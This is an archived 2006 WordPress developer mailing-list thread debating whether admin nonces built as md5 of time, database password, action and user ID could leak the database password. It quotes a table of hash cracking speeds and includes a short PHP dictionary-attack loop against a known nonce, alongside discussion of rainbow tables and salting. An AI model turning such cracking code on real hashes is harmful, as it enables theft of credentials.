> I'm happy to educate myself as to the operation of MD5, if 
> you think that will help. Is there something particular about 
> MD5 as opposed to other hashing functions that makes it 
> worthy of attention?


>From the postgresql crypto contrib's doc:


4.4.  Comparison of crypt and regular hashes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Here is a table that should give overview of relative slowness
of different hashing algorithms.

* The goal is to crack a 8-character password, which consists:
  1.  Only of lowercase letters
  2.  Numbers, lower- and uppercase letters.
* The table below shows how much time it would take to try all
  combinations of characters.
* The `crypt-bf` is featured in several settings - the number
  after slash is the `rounds` parameter of `gen_salt()`.

`------------'----------'--------------'--------------------
Algorithm     Hashes/sec  Chars: [a-z]   Chars: [A-Za-z0-9]
------------------------------------------------------------
crypt-bf/8            28     246 years         251322 years
crypt-bf/7            57     121 years         123457 years
crypt-bf/6           112      62 years          62831 years
crypt-bf/5           211      33 years          33351 years
crypt-md5           2681     2.6 years           2625 years
crypt-des         362837        7 days             19 years
sha1              590223        4 days             12 years
md5              2345086         1 day              3 years
------------------------------------------------------------

* The machine used is 1.5GHz Pentium 4.
* crypt-des and crypt-md5 algorithm numbers are taken from
  John the Ripper v1.6.38 `-test` output.
* MD5 numbers are from mdcrack 1.2.
* SHA1 numbers are from lcrack-20031130-beta.
* `crypt-bf` numbers are taken using simple program that loops
  over 1000 8-character passwords.  That way I can show the speed with
  different number of rounds.  For reference: `john -test` shows 213
  loops/sec for crypt-bf/5.  (The small difference in results is in
  accordance to the fact that the `crypt-bf` implementation in pgcrypto
  is same one that is used in John the Ripper.)

Note that "try all combinations" is not a realistic exercise.
Usually password cracking is done with the help of dictionaries, which
contain both regular words and various mutations of them.  So, even
somewhat word-like passwords could be cracked much faster than the above
numbers suggest, and a 6-character non-word like password may escape
cracking.  Or not.

From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 23:04:08 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 23:09:12 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000601c66596$541d3d60$2f01a8c0@kergan>
References: <000601c66596$541d3d60$2f01a8c0@kergan>
Message-ID: <444964E8.8060903@paul-mitchell.me.uk>

Denis de Bernardy wrote:
> md5              2345086         1 day              3 year
Three years of brute force is more than I'd use to get a password. My
curiosity is satisfied.

Many thanks, Denis et. al. Very useful information.

Paul

From false.hopes at gmail.com  Fri Apr 21 23:12:49 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 23:16:53 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000601c66596$541d3d60$2f01a8c0@kergan>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
Message-ID: <a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>

On 4/21/06, Denis de Bernardy <denis@semiologic.com> wrote:
> Note that "try all combinations" is not a realistic exercise.
> Usually password cracking is done with the help of dictionaries, which
> contain both regular words and various mutations of them.  So, even
> somewhat word-like passwords could be cracked much faster than the above
> numbers suggest, and a 6-character non-word like password may escape
> cracking.  Or not.

Still, all of this is irrelevant to the discussion, which has nothing
to do with cracking md5s or finding their collisions. Even if you did
want to use this approach to try to figure out someone's db pass,
you're almost guaranteed to have at least 12 characters (1 for user
ID, 5 for the variable time bit, and at least 6 for your MySQL
password (probably could be less, but realisitically, it rarely will
be)). To be blunt, its unrealisitic to think that someone could get
your nonce (this in itself would be a chore) and from there crack your
database password, and even if done, get access to your database
(which is more likely than not set up to only accept local connections
through a socket on most shared hosts).

We're working in an environment where speed is of the utmost
importance, switching to an algorithm which is twice as slow to do
these checks when navigating the admin will cost us majorly,
especially while we're supporting PHP 4.1.x, and 4.2.x and the
possibility of having to reimplement one of these hashing algorithms
in PHP. To put it bluntly, md5 is good enough for this purpose, to
argue its usefulness for passwords, please open a different thread,
and I'll agree with you wholeheartedly there.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Fri Apr 21 23:30:37 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 23:34:40 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <44495964.6080604@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
Message-ID: <a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>

On 4/21/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> However, I suspect what you've discovered is the well-known problem
> where GET is used for operations with side effects, a common flaw in web
> apps designed by people who don't understand HTTP.

I'd like to pipe in with one possible reason (and most likely the
actual reason) for why this hasn't already been done in WordPress, and
the check_admin_referer() function was added as a band-aid to this
wound.

Think about every area in the admin panel where it makes sense to use
a normal link instead of a form button to do things. Let's take the
manage posts page, where the Delete action is one that uses GET to
carry out an action. Now, let's think about a cross browser way to
make this link POST its data instead, without javascript, because we
have to be kind to those who disable javascript. Oh, yeah, we can make
a form with a submit button, but that doesn't match all the other
links to do things on the page, and it'd look completely wrong if we
changed everything to submit buttons. Oh wait, we can style that with
CSS? You're leaving a few browsers out. So now what do we have? An
ugly interface, which will surely raise more eyebrows, to fix a
problem that has a different solution.

As far as I'm concerned, until there is a solution that makes sense
for this problem, I'm fine with abusing the HTTP standard.


--
--Robert Deaton
http://somethingunpredictable.com
From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 23:45:47 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 23:50:50 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
Message-ID: <44496EAB.8030704@paul-mitchell.me.uk>

Robert Deaton wrote:
> Still, all of this is irrelevant to the discussion, which has nothing
> to do with cracking md5s or finding their collisions.
Quite. My interest is rather more simple.

Given that WordPress is multi-user, nonces will be available to anyone
entrusted with access to so-protected admin functions by the blog owner,
who is presumably also the sole knower of the database password.

I probably don't appreciate the scale of effort required to extracting
data from nonces, but was the blog database password subject to
cryptographic attack, theoretical or otherwise, prior to the
introduction of the nonce? It was the use of the database password for
something other than connecting to the database that caught my eye in
the first place.

Paul

From false.hopes at gmail.com  Sat Apr 22 00:15:26 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 00:19:29 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44496EAB.8030704@paul-mitchell.me.uk>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
Message-ID: <a491f91d0604211715r25f2fab9j46cdd78edf3ea440@mail.gmail.com>

On 4/21/06, Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:
> Given that WordPress is multi-user, nonces will be available to anyone
> entrusted with access to so-protected admin functions by the blog owner,
> who is presumably also the sole knower of the database password.

"entrusted with access" are some key words here. If you don't trust
your users not to bring down your site, do not give them access.

> I probably don't appreciate the scale of effort required to extracting
> data from nonces, but was the blog database password subject to
> cryptographic attack, theoretical or otherwise, prior to the
> introduction of the nonce? It was the use of the database password for
> something other than connecting to the database that caught my eye in
> the first place.

DB_PASS has been used as salt in various places. At one point (I don't
remember if it still is, but) it was used in cron, its used in the db
backup plugin, its used in the persistant options cache. This risk is
infinitely small.

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Sat Apr 22 00:17:10 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sat Apr 22 00:21:35 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
Message-ID: <44497606.1060105@midnightcircus.com>

Robert Deaton wrote:
> On 4/21/06, Denis de Bernardy <denis@semiologic.com> wrote:
>> Note that "try all combinations" is not a realistic exercise.
>> Usually password cracking is done with the help of dictionaries, which
>> contain both regular words and various mutations of them.  So, even
>> somewhat word-like passwords could be cracked much faster than the above
>> numbers suggest, and a 6-character non-word like password may escape
>> cracking.  Or not.
> 
> Still, all of this is irrelevant to the discussion, which has nothing
> to do with cracking md5s or finding their collisions. 

+1.

Owen
From ringmaster at midnightcircus.com  Sat Apr 22 00:41:53 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sat Apr 22 00:46:14 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44496EAB.8030704@paul-mitchell.me.uk>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
Message-ID: <44497BD1.2060703@midnightcircus.com>

Paul Mitchell wrote:
> Robert Deaton wrote:
>> Still, all of this is irrelevant to the discussion, which has nothing
>> to do with cracking md5s or finding their collisions.
> Quite. My interest is rather more simple.
> 
> Given that WordPress is multi-user, nonces will be available to anyone
> entrusted with access to so-protected admin functions by the blog owner,
> who is presumably also the sole knower of the database password.

Yes.  And every nonce is unique to both the action intended and the user 
who is using it, and expires after no more than 24 hours.  Go ahead and 
try to use the nonce you see when you're logged in to insert a link in 
the admin on which someone else with admin access could click to cause 
an unintended action.  You can't.

If you had tried patching a test install and attempted this, you would 
already know that.

> I probably don't appreciate the scale of effort required to extracting
> data from nonces, but was the blog database password subject to
> cryptographic attack, theoretical or otherwise, prior to the
> introduction of the nonce? It was the use of the database password for
> something other than connecting to the database that caught my eye in
> the first place.

To answer your question directly, no.  Nor is it after the introduction 
of the nonces.

Now more than one person has answered this question more than once.  If 
you still don't believe what these people have said, then I suggest you 
read the several pages of reference they've provided along the way, and 
then review the patch that was presented so that you can ask a directed 
question.

It should be fairly plain by looking at the code that you can't get the 
database password from the nonce, and that the choice of md5 over some 
other hash doesn't make this any more or less secure.

I don't mind criticism, but I'm not keen on people alluding to severe 
security issues like revealing the database password without having 
something other than raw speculation to back it up.  Patch in this diff 
and test it, and when you find the vulnerability you're worried about, 
then we'll talk.

Owen



From sam at rephrase.net  Sat Apr 22 01:33:52 2006
From: sam at rephrase.net (Sam Angove)
Date: Sat Apr 22 01:37:57 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44497BD1.2060703@midnightcircus.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
Message-ID: <aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>

On 4/22/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> I don't mind criticism, but I'm not keen on people alluding to severe
> security issues like revealing the database password without having
> something other than raw speculation to back it up.  Patch in this diff
> and test it, and when you find the vulnerability you're worried about,
> then we'll talk.

For token `md5($end . DB_PASS . $action . $uid)`, can't you do:

foreach ($dictionary as $word) {
	if (md5($known_time . $word . $known_action . $known_uid) == $known_nonce) {
		echo "omg! the db password is $word !!!1";
	}
}

?
From Brian at TheCodeCave.com  Sat Apr 22 01:37:25 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Sat Apr 22 01:41:34 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
Message-ID: <000c01c665ad$50fca500$0664a8c0@tiger1>

>echo "omg! the db password is $word !!!";
Now stop that! My wife is asking me why I'm laughing!

From m at mullenweg.com  Sat Apr 22 01:45:05 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat Apr 22 01:49:12 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>	<44496EAB.8030704@paul-mitchell.me.uk>	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
Message-ID: <44498AA1.7030000@mullenweg.com>

Sam Angove wrote:
> For token `md5($end . DB_PASS . $action . $uid)`, can't you do:

Here's a hash of my database password:

ce5f9c026dbec8ca821ea3c702dc540c

When you figure it out, post to my blog.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ryan at boren.nu  Sat Apr 22 01:45:29 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Apr 22 01:49:34 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>	<44496EAB.8030704@paul-mitchell.me.uk>	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
Message-ID: <44498AB9.50404@boren.nu>

Sam Angove wrote:
> For token `md5($end . DB_PASS . $action . $uid)`, can't you do:
> 
> foreach ($dictionary as $word) {
> 	if (md5($known_time . $word . $known_action . $known_uid) == $known_nonce) {
> 		echo "omg! the db password is $word !!!1";
> 	}
> }

Throw in uniqid(rand(), true) so as to foil the aneristic greyfaces with 
our hot eristic vibes.

Ryan
From ryan at boren.nu  Sat Apr 22 01:46:47 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Apr 22 01:50:53 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44498AA1.7030000@mullenweg.com>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>	<44496EAB.8030704@paul-mitchell.me.uk>	<44497BD1.2060703@midnightcircus.com>	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
	<44498AA1.7030000@mullenweg.com>
Message-ID: <44498B07.8090707@boren.nu>

Matt Mullenweg wrote:
> Sam Angove wrote:
> 
>> For token `md5($end . DB_PASS . $action . $uid)`, can't you do:
> 
> 
> Here's a hash of my database password:
> 
> ce5f9c026dbec8ca821ea3c702dc540c
> 
> When you figure it out, post to my blog.
> 

something . bbq . something

:-)


Ryan
From ryan at concept64.com  Sat Apr 22 01:48:46 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Sat Apr 22 01:52:52 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000c01c665ad$50fca500$0664a8c0@tiger1>
References: <000c01c665ad$50fca500$0664a8c0@tiger1>
Message-ID: <44498B7E.6060005@concept64.com>

Let's have a contest to see who can write the best code to figure out 
their own passwords fastest!

----

Concept 64, Inc. | Phone: 610.349.0703 | Web: www.concept64.com

From false.hopes at gmail.com  Sat Apr 22 02:01:57 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 02:06:02 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
Message-ID: <a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>

On 4/21/06, Sam Angove <sam@rephrase.net> wrote:
> For token `md5($end . DB_PASS . $action . $uid)`, can't you do:
>
> foreach ($dictionary as $word) {
>         if (md5($known_time . $word . $known_action . $known_uid) == $known_nonce) {
>                 echo "omg! the db password is $word !!!1";
>         }
> }
>

First, you'd have to get a nonce. Explain to me how you would even
approach that, and then maybe this code is valid, but even at that
point, the time to md5 an entire database is weeks, and that won't
even cover all passwords. Like was posted before, for all alphanumeric
passwords 8 characters long, it'd take the average PC 3 years to
crack. Think about the time it'd take in the range of 6-12 characters,
you're talking about spending your lifetime cracking one md5 password.
This is unrealistic, and like Owen said, when someone comes up with a
working exploit, post again, otherwise, drop it.

--
--Robert Deaton
http://somethingunpredictable.com
From m at mullenweg.com  Sat Apr 22 02:05:27 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat Apr 22 02:09:28 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44498B07.8090707@boren.nu>
References: <4449529E.2040002@paul-mitchell.me.uk>	<000601c66596$541d3d60$2f01a8c0@kergan>	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>	<44496EAB.8030704@paul-mitchell.me.uk>	<44497BD1.2060703@midnightcircus.com>	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>	<44498AA1.7030000@mullenweg.com>
	<44498B07.8090707@boren.nu>
Message-ID: <44498F67.5030703@mullenweg.com>

Ryan Boren wrote:
>> Here's a hash of my database password:
>>
>> ce5f9c026dbec8ca821ea3c702dc540c
>>
>> When you figure it out, post to my blog.
>>
> 
> something . bbq . something

OMGWTFBBQ!

You sunk my battleship.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From false.hopes at gmail.com  Sat Apr 22 02:23:33 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 02:27:37 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
Message-ID: <a491f91d0604211923x771c2d6cj63d3ade0fbe7c7cb@mail.gmail.com>

On 4/21/06, Sam Angove <sam@rephrase.net> wrote:
> On 4/22/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> >
> > I don't mind criticism, but I'm not keen on people alluding to severe
> > security issues like revealing the database password without having
> > something other than raw speculation to back it up.  Patch in this diff
> > and test it, and when you find the vulnerability you're worried about,
> > then we'll talk.
>
> For token `md5($end . DB_PASS . $action . $uid)`, can't you do:
>
> foreach ($dictionary as $word) {
>         if (md5($known_time . $word . $known_action . $known_uid) == $known_nonce) {
>                 echo "omg! the db password is $word !!!1";
>         }
> }
>

a nonce: efa6f570e5736800e6ef28783c15fc41
the action: deletepost
the time: Fri Apr 21, 10:20:53 PM EDT
my UID: 1

Please, take down my site once you have cracked my database password.
*Hibernates for 20 years*


--
--Robert Deaton
http://somethingunpredictable.com
From sam at rephrase.net  Sat Apr 22 02:38:24 2006
From: sam at rephrase.net (Sam Angove)
Date: Sat Apr 22 02:42:29 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
	<a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>
Message-ID: <aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>

On 4/22/06, Robert Deaton <false.hopes@gmail.com> wrote:
>
> First, you'd have to get a nonce. Explain to me how you would even
> approach that, and then maybe this code is valid, but even at that
> point, the time to md5 an entire database is weeks, and that won't
> even cover all passwords. Like was posted before, for all alphanumeric
> passwords 8 characters long, it'd take the average PC 3 years to
> crack. Think about the time it'd take in the range of 6-12 characters,
> you're talking about spending your lifetime cracking one md5 password.
> This is unrealistic, and like Owen said, when someone comes up with a
> working exploit, post again, otherwise, drop it.

Any registered user can get their own nonce with that notorious hacker
trick, "view source". Dastardly!

re: the various challenges offered, it's been pointed out time and
again that people on this list aren't representative users. I don't
have a dictionary word as a password; my mum does. That puts the
keyspace down from > 2500000000000 to less than 100000. That's an
afternoon, not a lifetime. Someone that actually cared could use
rainbow tables and do any  8-char alphanumeric password in < 20
minutes, but that person is not me.

Seriously though, I don't care about this "attack", I'm not being
paranoid, and I don't think this is something anyone's ever actually
going to do. I'm just pointing out that it's theoretically possible,
and it's silly to leave it when it can be trivially avoided by adding
extra salt or doing something like what the DB backup plugin does:

   substr( md5( md5( DB_PASSWORD ) ), -5 )
From Brian at TheCodeCave.com  Sat Apr 22 02:52:29 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Sat Apr 22 02:56:34 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000c01c665ad$50fca500$0664a8c0@tiger1>
Message-ID: <001e01c665b7$cc491540$0664a8c0@tiger1>

Brian, speaking with his foot in his mouth, said
>>echo "omg! the db password is $word !!!";
>Now stop that! My wife is asking me why I'm laughing!

I'm sorry Sam, I guess I only glanced at that post. 

I thought you were saying the password really must actually be "dollar
sign" Word. (Well it seemed funny at the time.)

I didn't realize you were asking a serious question.  OK, foot out of my
mouth, I can say, yes that is possible to do on a simple hash as you've
described it.  

HOWEVER, there are several very difficult things to overcome with Owen's
proposal that aren't covered in your example.

The first thing is that Owen encrypts using both the DB password AND the
current user password.  So you'd have to go through the dictionary once
for every word in your dictionary.
There's a good chance you'd have to do it in upper lower or mixed case.
The biggest factor is that the DB password is quite often assigned to
the user by the automated tool for creating the DB.  That means the
password will not be a word. 

Thus the whole thing is pretty impossible.


From false.hopes at gmail.com  Sat Apr 22 03:05:44 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 03:09:49 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
	<a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>
	<aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>
Message-ID: <a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>

On 4/21/06, Sam Angove <sam@rephrase.net> wrote:
>
> Any registered user can get their own nonce with that notorious hacker
> trick, "view source". Dastardly!

Like I said before, people with access to your blog should be "trusted
users" as someone said earlier. If you can't trust the users on your
blog, you have bigger issues at hand.

> re: the various challenges offered, it's been pointed out time and
> again that people on this list aren't representative users. I don't
> have a dictionary word as a password; my mum does. That puts the
> keyspace down from > 2500000000000 to less than 100000. That's an
> afternoon, not a lifetime. Someone that actually cared could use
> rainbow tables and do any  8-char alphanumeric password in < 20
> minutes, but that person is not me.

You get funnier and funnier, a rainbow table, that happens to be
prepended with a five digit integer and augmented with a 1-2 digit
integer, now this I'd like to see.

> Seriously though, I don't care about this "attack", I'm not being
> paranoid, and I don't think this is something anyone's ever actually
> going to do.

This would be self-admission of trolling, imho.

>  I'm just pointing out that it's theoretically possible,
> and it's silly to leave it when it can be trivially avoided by adding
> extra salt or doing something like what the DB backup plugin does:

This is also something that has to be propogated on every WP admin
action, and so anything that adversely affects performance is a -1, we
get enough complaints of how bad WP damages servers and buckles under
load as it is. We're playing in a world where 17ms makes a human
perceptible difference in the loading time. Any extra salt is going to
come with the same exact criticism as having DB_PASS as salt.

--
--Robert Deaton
http://somethingunpredictable.com
From davebytes at comcast.net  Sat Apr 22 03:43:52 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Apr 22 03:47:21 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
References: <4449529E.2040002@paul-mitchell.me.uk><000601c66596$541d3d60$2f01a8c0@kergan><a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com><44496EAB.8030704@paul-mitchell.me.uk><44497BD1.2060703@midnightcircus.com><aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com><a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com><aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>
	<a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>
Message-ID: <018d01c665be$f9939c30$6e01a8c0@sixfour>

Robert Deaton <false.hopes@gmail.com> wrote:
| On 4/21/06, Sam Angove <sam@rephrase.net> wrote:
| >
| > Any registered user can get their own nonce with that notorious hacker
| > trick, "view source". Dastardly!
|
| Like I said before, people with access to your blog should be "trusted
| users" as someone said earlier. If you can't trust the users on your
| blog, you have bigger issues at hand.

Actually, that's not a fair point.  With things like bbPress able to use the 
WP user table, ALL users become blog users (at some level).  So if anything 
exposed to even a profile-access-only user gives a Nonce, the three-of-four 
subparts have been achieved.

| >  I'm just pointing out that it's theoretically possible,
| > and it's silly to leave it when it can be trivially avoided by adding
| > extra salt or doing something like what the DB backup plugin does:
|
| This is also something that has to be propogated on every WP admin
| action, and so anything that adversely affects performance is a -1, we
| get enough complaints of how bad WP damages servers and buckles under
| load as it is. We're playing in a world where 17ms makes a human
| perceptible difference in the loading time. Any extra salt is going to
| come with the same exact criticism as having DB_PASS as salt.

Wow.  17ms on a >website loading< is human perceptible?  That's harsh. 
Especially given 150ms ping times... ;)

But really, skip the double-md5, just substr to remove some number of 
characters off the hash, should be amazingly fast compared to the original 
md5, and that should make it (nearly) impossible to reverse-crack. (right?) 
No human-perceptible time to a substr (I hope not!), and it makes the hash 
'incomplete' to a hacker.

Just imho.  Anything to stop the 'here, try to hack my site' emails! ;)

-d 

From false.hopes at gmail.com  Sat Apr 22 03:48:03 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Apr 22 03:52:09 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <018d01c665be$f9939c30$6e01a8c0@sixfour>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
	<a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>
	<aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>
	<a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>
	<018d01c665be$f9939c30$6e01a8c0@sixfour>
Message-ID: <a491f91d0604212048s4f0fcfdam3db7ef11bf038f84@mail.gmail.com>

On 4/21/06, David Chait <davebytes@comcast.net> wrote:
>
> But really, skip the double-md5, just substr to remove some number of
> characters off the hash, should be amazingly fast compared to the original
> md5, and that should make it (nearly) impossible to reverse-crack. (right?)
> No human-perceptible time to a substr (I hope not!), and it makes the hash
> 'incomplete' to a hacker.

I've got no problem with this, but I'll warn in advance of the "nonces
are too short and not varied enough because they're only hexadecimal,
we only have 2^[number of chars we keep] possible combinations, and so
they can be brute forced in only 10 years. Let me raise some hell on
the hackers list over nothing."

> Just imho.  Anything to stop the 'here, try to hack my site' emails! ;)

Anything to stop the "look, I can hack your site in 10 years if I can
get a nonce" emails.

>
> -d
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
--Robert Deaton
http://somethingunpredictable.com
From sam at rephrase.net  Sat Apr 22 04:02:51 2006
From: sam at rephrase.net (Sam Angove)
Date: Sat Apr 22 04:06:56 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>
References: <4449529E.2040002@paul-mitchell.me.uk>
	<000601c66596$541d3d60$2f01a8c0@kergan>
	<a491f91d0604211612tc3076c6p36579748173d24d3@mail.gmail.com>
	<44496EAB.8030704@paul-mitchell.me.uk>
	<44497BD1.2060703@midnightcircus.com>
	<aa74b1910604211833q7b2d7f03vd9971de37fca6ad5@mail.gmail.com>
	<a491f91d0604211901k7cbe47d4q2d6963d8271c0868@mail.gmail.com>
	<aa74b1910604211938t772c280bp9bb7c415a9cb4bc9@mail.gmail.com>
	<a491f91d0604212005i50b714c8n3287a8554972f61c@mail.gmail.com>
Message-ID: <aa74b1910604212102h78ed0693p43db91547a70bacf@mail.gmail.com>

